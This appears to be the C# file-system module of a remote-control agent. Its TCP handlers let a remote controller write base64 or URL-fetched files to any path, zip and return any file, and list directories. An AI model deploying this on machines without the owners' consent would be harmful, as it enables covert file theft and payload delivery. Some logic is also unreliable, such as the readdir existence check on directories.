using FSModule.Structures;
using FSModule.Structures.Handlers;
using LannLogger;
using ModulesApi;
using Networking;
using Networking.Packets;
using Networking.Structures;
using Serilog.Core;
using SystemModule.Structures;

namespace FSModule;

[Module("fs")]
public class FSModuleImpl : IModule {
    private static readonly Logger Logger = LoggerFactory.CreateLogger("Module", "FileSystem");

    [Handler("download")]
    public async Task DownloadHandler(TCPClient client, DownloadHandlerData data) {
        DownloadResult result = new();
        if (data.Raw != null) {
            byte[] raw = Convert.FromBase64String(data.Raw);

            try {
                await File.WriteAllBytesAsync(data.Path, raw);
                result.RawSuccess = true;
            } catch (Exception error) {
                Logger.Error("Failed to write RAW to {Path}: {Error}",
                    data.Path, error);
                result.RawSuccess = false;
                result.RawError = error.Message;

                await Callback(client, "download", result);
                return;
            }
        }

        if (!string.IsNullOrEmpty(data.SourceURL)) {
            bool valid = Uri.IsWellFormedUriString(data.SourceURL, UriKind.Absolute);
            Uri url = new(data.SourceURL);

            if (!valid) {
                Logger.Error("Invalid URL Provided: {URL}", data.SourceURL);
                result.SourceSuccess = false;
                result.SourceError = "Invalid URL Provided";

                await Callback(client, "download", result);
                return;
            }

            try {
                using HttpClient httpClient = new();
                using HttpResponseMessage message = await httpClient.GetAsync(url);
                await using Stream stream = await message.Content.ReadAsStreamAsync();

                FileStream fileStream = File.Create(data.Path);
                await stream.CopyToAsync(fileStream);

                result.SourceSuccess = true;
            } catch (Exception e) {
                result.SourceSuccess = false;
                result.SourceError = e.Message;
            }
        }

        await Callback(client, "download", result);
    }

    [Handler("upload")]
    public async Task UploadHandler(TCPClient client, UploadHandlerData data) {
        UploadResult result = new();

        if (!File.Exists(data.Path)) {
            result.Success = false;
            result.Error = "File does not exist";

            await Callback(client, "upload", result);
            return;
        }

        result.Success = true;
        result.Raw = Convert.ToBase64String(Utils.CreateZipFile(data.Path));

        await Callback(client, "upload", result);
    }

    [Handler("readdir")]
    public async Task ReaddirHandler(TCPClient client, ReaddirHandlerData data) {
        ReaddirResult result = new();

        if (!File.Exists(data.Path)) {
            result.Success = false;
            result.Error = "File does not exist";

            await Callback(client, "readdir", result);
            return;
        }

        DirectoryInfo info = new(data.Path);
        string[] files = info.GetFiles().Select(x => x.Name).ToArray();
        string[] directories = info.GetDirectories().Select(x => x.Name).ToArray();

        result.Success = true;
        result.Files = files;
        result.Directories = directories;

        await Callback(client, "readdir", result);
    }
}